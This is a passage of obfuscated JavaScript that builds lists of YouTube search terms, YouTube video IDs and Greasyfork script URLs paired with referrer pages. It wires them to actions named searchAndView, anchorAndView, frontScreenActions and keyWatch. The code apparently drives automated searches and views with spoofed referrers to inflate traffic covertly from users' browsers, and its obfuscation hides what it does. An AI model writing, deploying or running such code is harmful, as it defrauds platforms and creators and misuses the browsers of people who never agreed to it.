'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xde7 + -0x1ac4 + 0x16f * 0x9)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x86 * -0x1e + 0x23a4 + -0x334e)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + Y(0x10) + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x5 * 0x293 + 0x1 * -0x1822 + -0x27 * -0x4a);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    W(0x4) + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + W(0xd) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + X(0x7, 'R#ni'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + Y(0x13) + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
